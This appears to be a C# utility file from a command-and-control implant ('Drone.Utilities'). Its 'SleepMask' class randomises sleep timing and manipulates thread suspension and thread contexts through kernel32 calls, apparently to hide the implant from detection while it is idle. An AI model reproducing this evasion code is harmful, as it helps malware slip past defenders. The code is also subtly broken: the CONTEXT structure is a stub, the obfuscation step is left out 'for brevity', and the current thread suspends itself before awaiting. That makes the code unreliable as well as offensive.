using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace Drone.Utilities;

public static class SleepMask
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll")]
    private static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [StructLayout(LayoutKind.Sequential)]
    private struct CONTEXT
    {
        public uint ContextFlags;
        // Other context fields omitted for brevity
    }

    private const uint CONTEXT_FULL = 0x10007;

    public static async Task ObfuscatedSleep(int milliseconds)
    {
        // Split sleep into random intervals
        var remaining = milliseconds;
        var random = new Random();

        while (remaining > 0)
        {
            var interval = Math.Min(remaining, random.Next(100, 500));
            
            // Randomly choose between different sleep techniques
            switch (random.Next(3))
            {
                case 0:
                    await Task.Delay(interval);
                    break;
                
                case 1:
                    await ThreadSuspendSleep(interval);
                    break;
                
                case 2:
                    await ContextSwitchSleep(interval);
                    break;
            }

            remaining -= interval;
        }
    }

    private static async Task ThreadSuspendSleep(int milliseconds)
    {
        var thread = GetCurrentThread();
        
        try
        {
            SuspendThread(thread);
            await Task.Delay(milliseconds);
        }
        finally
        {
            ResumeThread(thread);
        }
    }

    private static async Task ContextSwitchSleep(int milliseconds)
    {
        var thread = GetCurrentThread();
        var context = new CONTEXT { ContextFlags = CONTEXT_FULL };
        
        try
        {
            if (GetThreadContext(thread, ref context))
            {
                // Store original context
                var originalContext = context;
                
                // Modify context to obfuscate
                // Implementation details omitted for brevity
                
                SetThreadContext(thread, ref context);
                await Task.Delay(milliseconds);
                
                // Restore original context
                SetThreadContext(thread, ref originalContext);
            }
        }
        catch
        {
            // Fallback to normal sleep
            await Task.Delay(milliseconds);
        }
    }
}
